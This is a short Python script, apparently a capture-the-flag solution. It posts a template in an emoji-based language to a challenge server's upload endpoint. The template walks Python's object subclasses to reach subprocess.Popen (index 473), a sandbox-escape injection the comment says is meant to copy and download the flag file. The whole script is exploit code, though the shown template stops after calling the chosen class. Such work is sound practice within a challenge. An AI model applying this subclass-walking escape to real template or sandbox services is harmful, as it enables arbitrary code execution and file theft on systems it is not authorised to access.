import requests

url = "https://homecookeds_revenge.challs.pwnoh.io/"
#url = "http://127.0.0.1:8000"

s = requests.Session()

# get subclasses of object, find subprocess.Popen, copy flag to upload dir, download flag
template = """
🍴 a 🍇 object 🍴
🍴 subaccess 🍇 "__subclasses__" 🍴
🍴 fl 🍇 "fl" 🍴
🍴 ag 🍇 "ag" 🍴
🍴 winaccess 🍇 fl 🍦 ag🍴


🍴 a 🍇 a 🥚 subaccess 🍴
🍴 b 🍇 a 🦀 🦞 🍴
🥢 b 🥢

🍴 count 🍇 0 🍴

🍴 🍔 pls 🍟 b 🥄
  🥢 count 🥢
🍴 count 🍇 count 🍦 1 🍴

  🥢 pls 🥢
🥄🍴

🍴 callme 🍇 b 🍎 473 🍏🍴
🍴 a 🍇 callme 🦀 🦞 🍴
🥢 a 🥢

"""

r = s.post(url + '/chef/upload', json={'text': template})
print(r.text)
